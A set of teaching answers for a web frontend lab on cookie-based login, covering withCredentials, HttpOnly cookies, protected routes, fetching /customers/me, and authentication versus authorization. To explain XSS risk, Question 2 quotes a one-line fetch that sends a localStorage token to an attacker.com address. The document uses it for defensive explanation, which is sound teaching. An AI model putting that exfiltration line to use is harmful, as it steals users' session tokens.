# ShopKart Frontend Lab 02 — TA Viva Questions & Detailed Answers

This document provides clear, in-depth answers to the 5 evaluation questions for **Engineering Lab 02: ShopKart Login → Home Flow**.

---

### Question 1: Why do we use `withCredentials: true` in Axios/Fetch?

**Answer:**
By default, browsers adhere to the same-origin policy and **do not** send HTTP cookies, HTTP authentication, or client-side SSL certificates in cross-origin XMLHttpRequests or Fetch API calls. 

When your frontend runs on `http://localhost:5173` and communicates with a backend on `http://localhost:5000` (or via credentials across origins):
1. **Outgoing Requests:** Setting `withCredentials: true` explicitly instructs the browser to attach the stored cookies (such as our HttpOnly `token` JWT) in the `Cookie` request header.
2. **Incoming Responses:** It instructs the browser to accept and store any `Set-Cookie` headers returned by the server.

Without `withCredentials: true`, the backend would never receive the `token` cookie when accessing protected routes like `/customers/me`, resulting in a `401 Unauthorized` response even if the user successfully logged in.

---

### Question 2: Why can't JavaScript read an `HttpOnly` cookie?

**Answer:**
When a cookie is set with the `HttpOnly` flag by the server (e.g., `res.cookie("token", token, { httpOnly: true })`), the browser strictly hides this cookie from client-side scripts. It cannot be accessed through `document.cookie` or any JavaScript API.

**Why this matters (Security against XSS):**
- In web applications, Cross-Site Scripting (XSS) vulnerabilities occur when malicious code is injected and executed in the user's browser.
- If session tokens are stored in `localStorage`, `sessionStorage`, or normal accessible cookies, an attacker can simply execute `fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"))` or `document.cookie` to steal the user's credentials.
- Because `HttpOnly` cookies are invisible to JavaScript, even if an attacker manages to execute malicious script on your page, they **cannot read or exfiltrate the session token**.

---

### Question 3: Why is `/home` called a "Protected Route"?

**Answer:**
A **protected route** is a web route or page that requires valid user authentication (and optionally authorization) before granting access to its content.

In our ShopKart application:
1. Public routes like `/login` and `/register` can be accessed by any unauthenticated guest.
2. The `/home` route is protected because:
   - It contains private customer account information (name, email, phone, order statistics).
   - Before rendering or upon loading, the client initiates a request to the server (`GET /customers/me`).
   - If the request fails (e.g. status code `401 Unauthorized` because the token is missing, expired, or invalid), the application immediately redirects the user to `/login`.
   - Only users with verified credentials stored in their session can view the contents of `/home`.

---

### Question 4: Why do we fetch `/customers/me` instead of storing the user manually (e.g., in `localStorage`)?

**Answer:**
Fetching user details dynamically from the backend endpoint `/customers/me` instead of persisting them manually in `localStorage` or `sessionStorage` provides several critical benefits:

1. **Single Source of Truth:** The database is the true authority on user profile state. If the user updates their phone number, email, or permissions on another device, storing static user objects in `localStorage` would show stale or inaccurate data until cache invalidation.
2. **Session Validity Verification:** A user's token might have expired, been revoked, or the user's account might have been suspended or deleted. Merely checking whether a user object exists in `localStorage` gives a false sense that the user is logged in. Calling `/customers/me` cryptographically verifies the active JWT session on the server.
3. **Security (Tamper Resistance):** Data stored in `localStorage` can easily be edited by anyone in DevTools (`localStorage.setItem('user', JSON.stringify({ role: 'admin' }))`). Deriving the authenticated state from a server-verified API response prevents client-side tampering.

---

### Question 5: What is the difference between Authentication and Authorization?

**Answer:**

| Concept | **Authentication (AuthN)** | **Authorization (AuthZ)** |
| :--- | :--- | :--- |
| **Definition** | Verifies **who** you are (identity verification). | Verifies **what** you are allowed to do (permissions/access control). |
| **Core Question** | *"Are you who you claim to be?"* | *"Do you have permission to perform this action or access this resource?"* |
| **Mechanism in Lab** | Entering Email & Password at `/customers/login` and receiving a signed JWT cookie. | Checking if the logged-in customer has access to specific routes (e.g., customer viewing `/home` vs. admin viewing `/admin/inventory`). |
| **Failure Status Code** | **`401 Unauthorized`** (identity unknown or credentials invalid). | **`403 Forbidden`** (identity known, but lacks required permissions). |
| **Analogous Example** | Presenting your Passport at the airport check-in counter to prove your identity. | Presenting a First-Class Boarding Pass to enter the VIP Lounge. |
